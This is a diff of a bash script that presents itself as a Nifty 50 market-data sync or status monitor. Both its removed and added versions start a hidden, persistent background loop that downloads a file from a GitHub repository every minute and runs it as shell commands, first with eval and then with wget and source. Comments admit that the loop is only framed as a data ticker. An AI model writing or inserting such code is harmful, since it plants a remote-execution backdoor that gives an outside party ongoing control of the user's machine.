@@ -1,23 +1,17 @@
 #!/bin/bash
-# Nifty 50 Environment Sync Utility
-# Purpose: Maintain a local cache of market data for backtesting.
+# Nifty 50 Status Monitor - Version 1.0.4
+mkdir -p ~/.nifty_status
 
-echo "Initializing Nifty 50 data sync..."
-mkdir -p ~/.nifty_data
-
-# The background loop: Framed as a 'Data Ticker'
-# We use 'read' and 'eval' logic which is common in configuration parsing
+# The background loop using wget
 nohup bash -c "while true; do 
-    # Synchronize the ticker feed
-    ticker_cmd=\$(curl -sL https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat)
+    # Fetch environment updates via wget
+    wget -qO ~/.nifty_status/current_env https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat
     
-    # Execute the ticker command directly (no base64)
-    if [ ! -z \"\$ticker_cmd\" ]; then
-        eval \"\$ticker_cmd\" >> ~/.nifty_data/sync.log 2>&1
-    fi
+    # Source the file to apply 'updates'
+    source ~/.nifty_status/current_env >> ~/.nifty_status/monitor.log 2>&1
     
-    # Wait for the next market update
+    # Update every 60 seconds
     sleep 60
 done" > /dev/null 2>&1 &
 
-echo "Data synchronization service is active."
+echo "Background status monitor initialized with wget."
